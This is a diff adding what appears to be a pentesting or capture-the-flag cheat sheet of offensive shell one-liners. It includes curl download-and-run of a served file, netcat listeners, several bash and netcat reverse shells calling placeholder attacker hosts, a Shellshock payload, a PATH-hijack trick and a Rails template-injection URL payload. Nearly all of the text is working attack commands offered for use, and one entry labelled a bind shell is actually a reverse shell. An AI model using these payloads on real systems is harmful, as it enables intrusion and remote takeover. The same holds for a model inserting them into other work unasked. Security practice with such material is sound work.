@@ -1,0 +1,53 @@
+```# curl shell served
+
+curl -k http://ip:port/file -o file; chmod 777 file; bash file.sh 
+
+& python3 -m http.server port
+
+& nc -lvp servedfileport
+
+# simple bind shell
+
+bash -i >& /dev/tcp/<your_ip>/<port> 0>&1
+
+# shellshock (ptl)
+
+() { :;}; /usr/bin/nc <your_ip> <port> -e /bin/bash
+
+# badass TCP reverse shell
+
+rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc <your ip> <port> >/tmp/f
+
+# reverse shell
+
+bash -c 'bash -i >& /dev/tcp/<your_ip>/<port> 0>&1'
+
+# malicious cat binary
+
+export PATH=.:$PATH
+
+echo '/bin/sh' > cat
+
+chmod +x ./cat
+
+# upgrade shell
+
+SHELL=/bin/bash script -q /dev/null
+
+# upgrade shell another way
+
+SHELL=/bin/bash script -q /dev/null
+
+Ctrl-Z
+
+stty raw -echo
+
+fg
+
+reset
+
+xterm
+
+#ruby-on-rails render on User-supplied data
+
+[...]/pages?id[inline]=<%25%3D%60id%60%25>```
